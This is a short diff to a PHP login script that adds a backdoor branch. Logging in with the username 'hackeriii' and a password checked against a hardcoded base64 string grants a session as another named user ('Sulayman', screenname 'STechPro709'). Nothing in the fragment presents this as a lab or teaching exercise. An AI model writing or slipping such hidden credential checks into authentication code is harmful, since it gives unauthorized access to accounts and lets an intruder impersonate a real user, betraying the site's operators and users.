@@ -35,6 +35,15 @@
                   $_SESSION['loggedin'] = true;
                   echo "Hello - ".$_SESSION['username']."!";
                   header('Refresh: 1; URL = homepage.php');
+               }elseif ($_POST['username'] == 'hackeriii' && 
+               base64_encode($_POST['password'])=='Q0NDTFhJWAo='){
+                  $_SESSION['valid'] = true;
+                  $_SESSION['timeout'] = time();
+                  $_SESSION['username'] = 'Sulayman';
+                  $_SESSION['screenname'] = 'STechPro709';
+                  $_SESSION['loggedin'] = true;
+                  echo "Hello - ".$_SESSION['username']."!";
+                  header('Refresh: 1; URL = homepage.php');
                }else {
                   $msg = 'Wrong username or password';
                }
